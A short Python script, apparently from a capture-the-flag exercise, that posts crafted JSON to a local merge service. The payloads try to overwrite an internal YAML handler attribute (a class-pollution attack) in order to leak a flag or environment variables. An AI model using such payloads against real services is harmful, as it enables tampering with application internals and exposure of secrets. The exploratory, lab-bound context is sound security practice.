#!/usr/bin/env python3
import requests

URL = "http://localhost:6969/interpol8"

# Key insight: We can overwrite yaml_handler.odyldo.safe_dump!
# When return_type is "yaml", it calls:
# self.yaml_handler.odyldo.safe_dump(self.__get_dict__())

# If we make yaml_handler.odyldo be a dict with a "safe_dump" key,
# then accessing yaml_handler.odyldo.safe_dump will get that value!

# But we need safe_dump to be callable...or do we?
# Actually, what if the error message reveals something?

print("=== Test: Overwrite yaml_handler.odyldo ===")
payload = {
    "doc1": '{"yaml_handler": {"odyldo": {"safe_dump": "LEAKED"}}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "yaml"  # Use YAML output!
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:1000]}\n")

# What if we can make safe_dump be os.environ?
print("=== Test 2: Try to leak through structure ===")
payload = {
    "doc1": '{"yaml_handler": {"odyldo": {"safe_dump": {"FLAG": "value_here"}}}}',
    "doc2": '{"dummy": "data"}',
    "type1": "json",
    "type2": "json",
    "return_type": "yaml"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:1000]}\n")
